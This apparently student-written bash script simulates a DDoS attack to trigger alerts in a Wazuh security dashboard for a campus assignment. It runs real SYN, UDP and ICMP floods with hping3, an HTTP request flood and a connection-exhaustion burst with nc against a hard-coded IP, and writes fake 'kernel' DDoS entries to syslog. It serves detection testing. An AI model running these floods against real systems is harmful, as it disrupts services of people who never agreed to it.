#!/bin/bash
# ===================================================
# Simulasi DDoS Attack
# Jalankan di Agent (laptop) untuk trigger Wazuh alerts
# HANYA UNTUK TUJUAN EDUKASI - TUGAS KAMPUS
# ===================================================

echo "================================================="
echo "   SIMULASI: DDoS ATTACK"
echo "================================================="
echo "[WARNING] Ini hanya simulasi untuk tujuan edukasi!"
echo ""

TARGET="70.153.19.42"
LOG_TAG="ddos-simulation"

# Install tools jika belum ada
install_tool() {
    if ! command -v $1 &>/dev/null; then
        echo "  Installing $1..."
        sudo apt-get install -y $1 -qq 2>/dev/null
    fi
}

install_tool hping3
install_tool curl

echo "[1/5] SYN Flood Simulation (TCP flood ke port 80)..."
# Kirim banyak SYN packet ke localhost
if command -v hping3 &>/dev/null; then
    sudo hping3 -S --flood -V -p 80 $TARGET -c 500 2>/dev/null &
    HPING_PID=$!
    sleep 3
    kill $HPING_PID 2>/dev/null
    echo "  [DONE] 500 SYN packets sent ke port 80"
else
    # Fallback: log manual
    for i in $(seq 1 50); do
        logger -t "$LOG_TAG" "SYN flood attempt $i to $TARGET:80"
    done
    echo "  [DONE] SYN flood logged (hping3 tidak tersedia)"
fi

echo ""
echo "[2/5] UDP Flood Simulation..."
if command -v hping3 &>/dev/null; then
    sudo hping3 --udp --flood -p 53 $TARGET -c 300 2>/dev/null &
    HPING_PID=$!
    sleep 3
    kill $HPING_PID 2>/dev/null
    echo "  [DONE] 300 UDP packets sent ke port 53"
else
    for i in $(seq 1 50); do
        logger -t "$LOG_TAG" "UDP flood attempt $i to $TARGET:53"
    done
    echo "  [DONE] UDP flood logged"
fi

echo ""
echo "[3/5] HTTP Flood Simulation (Layer 7 DDoS)..."
# Banyak request HTTP sekaligus ke web server lokal
for i in $(seq 1 100); do
    curl -s -o /dev/null "http://$TARGET/?flood=$i&$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 10)" &
done
wait
echo "  [DONE] 100 HTTP requests sent"

echo ""
echo "[4/5] ICMP Flood Simulation (Ping flood)..."
if command -v hping3 &>/dev/null; then
    sudo hping3 --icmp --flood $TARGET -c 200 2>/dev/null &
    HPING_PID=$!
    sleep 3
    kill $HPING_PID 2>/dev/null
    echo "  [DONE] 200 ICMP packets sent"
else
    sudo ping -f -c 200 $TARGET 2>/dev/null || ping -c 200 -i 0.001 $TARGET 2>/dev/null
    echo "  [DONE] ICMP flood selesai"
fi

echo ""
echo "[5/5] Connection Exhaustion Simulation (banyak koneksi TCP)..."
# Buka banyak koneksi sekaligus
for i in $(seq 1 50); do
    (echo "" | nc -w 1 $TARGET 80 2>/dev/null) &
done
wait
# Log ke syslog supaya Wazuh pick up
for i in $(seq 1 30); do
    logger -t "kernel" "POSSIBLE DDoS ATTACK: $i connections from $TARGET"
    logger -t "$LOG_TAG" "HIGH TRAFFIC ANOMALY: connection flood detected attempt $i"
done
echo "  [DONE] 50 parallel connections + anomaly logs"

echo ""
echo "================================================="
echo "SIMULASI DDoS SELESAI!"
echo ""
echo "Cek Wazuh Dashboard:"
echo "  1. Login ke Dashboard https://70.153.19.42:443"
echo "  2. Buka Security Events"
echo "  3. Filter: rule.groups: attack OR rule.groups: ddos"
echo "  4. Atau filter: agent.name: DESKTOP-8EBI1VU"
echo "  5. Lihat anomalous traffic alerts"
echo ""
echo "================================================="
